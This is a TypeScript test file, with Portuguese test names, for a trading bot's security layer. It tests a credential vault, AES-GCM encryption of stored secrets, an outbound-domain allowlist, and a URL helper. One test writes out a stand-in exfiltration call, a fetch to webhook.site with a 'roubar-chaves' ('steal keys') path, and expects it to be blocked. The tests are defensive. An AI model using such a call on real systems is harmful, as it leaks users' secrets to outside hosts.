import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  inicializarCofre,
  getBinanceCredentials,
  getTelegramCredentials,
  cifrarSegredoBanco,
  decifrarSegredoBanco,
} from "./vault.ts";
import {
  isHostPermitido,
  validarDestinoRede,
  ativarNetworkGuard,
} from "./networkGuard.ts";
import { montarUrlComParams } from "../lib/http.ts";

describe("Segurança: Cofre de Credenciais (Vault) e limpeza de process.env", () => {
  it("deve capturar as credenciais e apagá-las de process.env imediatamente", () => {
    process.env.API_KEY_PROD = "chave-secreta-binance";
    process.env.SECRET_KEY_PROD = "segredo-hmac-binance";
    process.env.BOT_TOKEN = "123456:token-telegram";
    process.env.CHAT_ID = "-100999888";
    process.env.API_URL_PROD = "https://api.binance.com/api";
    process.env.STREAM_URL_PROD = "wss://stream.binance.com:9443/ws";

    inicializarCofre(true);

    // Credenciais críticas NÃO podem mais existir em process.env
    assert.equal(process.env.API_KEY_PROD, undefined);
    assert.equal(process.env.SECRET_KEY_PROD, undefined);
    assert.equal(process.env.BOT_TOKEN, undefined);

    // Mas devem continuar acessíveis internamente pelo cofre
    const binance = getBinanceCredentials();
    const telegram = getTelegramCredentials();
    assert.equal(binance.apiKey, "chave-secreta-binance");
    assert.equal(binance.secretKey, "segredo-hmac-binance");
    assert.equal(telegram.botToken, "123456:token-telegram");
    assert.equal(telegram.chatId, "-100999888");
  });

  it("deve cifrar e decifrar segredos de banco com AES-256-GCM", () => {
    const chaveOriginal = "cmc-pro-key-987654321";
    const cifrado = cifrarSegredoBanco(chaveOriginal);
    assert.ok(cifrado.startsWith("enc:v1:"));
    assert.notEqual(cifrado, chaveOriginal);

    const decifrado = decifrarSegredoBanco(cifrado);
    assert.equal(decifrado, chaveOriginal);

    // Retrocompatibilidade com valor legado em texto puro
    assert.equal(decifrarSegredoBanco("legado-sem-prefixo"), "legado-sem-prefixo");
  });
});

describe("Segurança: Firewall de Saída (NetworkGuard Allowlist)", () => {
  it("deve permitir apenas os domínios oficiais (Binance, CoinMarketCap, Telegram)", () => {
    assert.equal(isHostPermitido("api.binance.com"), true);
    assert.equal(isHostPermitido("stream.binance.com"), true);
    assert.equal(isHostPermitido("pro-api.coinmarketcap.com"), true);
    assert.equal(isHostPermitido("api.telegram.org"), true);
  });

  it("deve bloquear domínios externos não autorizados (exfiltração de dados)", () => {
    assert.equal(isHostPermitido("evil-attacker.com"), false);
    assert.equal(isHostPermitido("webhook.site"), false);
    assert.equal(isHostPermitido("api.binance.com.attacker.org"), false);

    assert.throws(
      () => validarDestinoRede("evil-attacker.com"),
      /Conexão de saída bloqueada/
    );
  });

  it("deve bloquear chamadas fetch para domínios fora da allowlist quando ativo", async () => {
    ativarNetworkGuard();
    await assert.rejects(
      async () => {
        await fetch("https://webhook.site/roubar-chaves?key=123");
      },
      /Conexão de saída bloqueada/
    );
  });
});

describe("Cliente HTTP nativo (substituto do axios)", () => {
  it("deve montar query parameters corretamente na URL", () => {
    const url = montarUrlComParams("https://api.binance.com/api/v3/ticker/24hr", {
      symbol: "SOLUSDT",
      limit: 20,
    });
    assert.equal(
      url,
      "https://api.binance.com/api/v3/ticker/24hr?symbol=SOLUSDT&limit=20"
    );
  });
});
